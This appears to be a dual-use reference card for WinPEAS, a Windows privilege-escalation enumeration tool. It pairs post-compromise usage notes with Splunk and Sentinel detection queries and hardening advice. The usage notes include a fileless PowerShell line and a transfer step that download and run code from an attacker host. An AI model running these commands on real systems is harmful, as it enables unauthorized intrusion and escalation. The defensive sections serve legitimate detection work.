name: WinPEAS - Windows Privilege Escalation Enumeration
description: WinPEAS is the de-facto Windows privilege escalation enumeration tool. It audits the host for privesc vectors - unquoted service paths, weak service/registry permissions, AlwaysInstallElevated, token privileges (SeImpersonate etc.), stored credentials, scheduled tasks, DPAPI, autologon, and known kernel/CVE indicators - and highlights likely findings in color. First tool to run after landing a Windows shell.
notes:
=== EXE (full, best output) ===
  winPEASx64.exe
  winPEASx86.exe
  winPEASx64.exe quiet cmd fast     # quiet banner, cmd checks, fast mode
  winPEASx64.exe log=winpeas.txt    # save output

=== BAT (no .NET needed) ===
  winPEAS.bat

=== PS1 / FILELESS ===
  # Download + run in memory:
  iex (New-Object Net.WebClient).DownloadString("http://<lhost>/winPEAS.ps1")

=== TRANSFER FIRST (no egress) ===
  # Attacker:
  python3 -m http.server 80
  # Target (PowerShell):
  iwr http://<lhost>/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe; C:\Windows\Temp\wp.exe

=== USEFUL ARGS ===
  fast          # skip slow checks
  searchall     # search all drives for sensitive files
  cmd           # run cmd-based checks
  systeminfo / userinfo / servicesinfo / applicationsinfo / windowscreds

=== READING RESULTS ===
  # RED = likely exploitable; GREEN = defense/good config
  # Focus on: service misconfigs, SeImpersonate/SeBackup/etc privileges,
  #   AlwaysInstallElevated, unquoted paths, stored creds, autologon

=== ALTERNATIVES / COMPLEMENTS ===
  PrivescCheck.ps1   # PowerShell, AV-friendly
  Seatbelt.exe       # C# situational awareness
  PowerUp.ps1        # service-focused + auto-exploit
  wesng / Watson     # kernel CVE matching
  # Verify findings manually (accesschk, sc qc, icacls)

recommended.note: PrivescCheck is the AV-friendly PowerShell alternative.
SharpUp/PowerUp auto-exploit service misconfigs WinPEAS finds.

defense.why_it_works: WinPEAS queries normal, user-readable Windows state (services, registry, ACLs, privileges, environment). It is noisy but uses standard APIs, so it runs reliably even as a low-priv user.
defense.prerequisites: Any shell on the target; appropriate WinPEAS variant (exe/bat/ps1).
defense.impact: Comprehensive mapping of every local Windows privesc vector in one pass.
defense.detection: [MITRE T1082/T1083] winpeas binary signatures (EDR/AV flag it by default); burst of sc query/reg query/whoami /priv/icacls/accesschk; mass registry and ACL enumeration.
defense.artifacts: winPEAS*.exe/bat/ps1 on disk; AMSI/Defender detections; 4688 process-creation spikes of enumeration utilities.
defense.splunk_spl:
index=windows EventCode=4688 (NewProcessName="*winPEAS*" OR CommandLine="*winpeas*" OR CommandLine="*accesschk*")
| table _time, SubjectUserName, NewProcessName, CommandLine
defense.sentinel_kql:
DeviceProcessEvents
| where FileName has "winPEAS" or ProcessCommandLine has "winpeas"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
defense.prevention: Harden services (quoted paths, strong ACLs), disable AlwaysInstallElevated, remove dangerous token privileges from non-admins, store no plaintext creds, keep patched; EDR/AV signatures catch winpeas by default; ASR + attack-surface reduction.

detections.name: WinPEAS / privesc enumeration execution
detections.logic:
DeviceProcessEvents
| where FileName has_any ("winPEAS","winPEASx64","winPEASx86") or ProcessCommandLine has "winpeas"
  or (FileName == "accesschk.exe" and ProcessCommandLine has_any ("-uwcqv","-accepteula"))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
detections.tuning: Renamed binaries evade name match - also alert on rapid sc/reg/whoami enumeration bursts
